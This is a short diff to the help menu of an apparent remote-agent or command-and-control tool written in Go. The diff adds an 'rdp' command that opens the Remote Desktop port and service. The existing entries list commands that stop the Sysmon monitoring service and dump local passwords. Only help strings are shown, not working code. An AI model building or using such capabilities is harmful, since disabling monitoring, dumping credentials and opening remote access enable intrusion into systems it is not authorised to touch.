@@ -125,6 +125,7 @@ func helpHandler(comando []string) {
 		println("exit:                  Exite for Agente Selected")
 		println("stopsys:                  Stop Sysmon Service Running")
 		println("startsys:                  Start Sysmon Service Running")
+		println("rdp:                  Open Port And Service Remote Desktop")
 		//TODO - Modulo de Quebrar Senhas
 		println("passwd:           Dump Passwords for local machine")
 	} else {
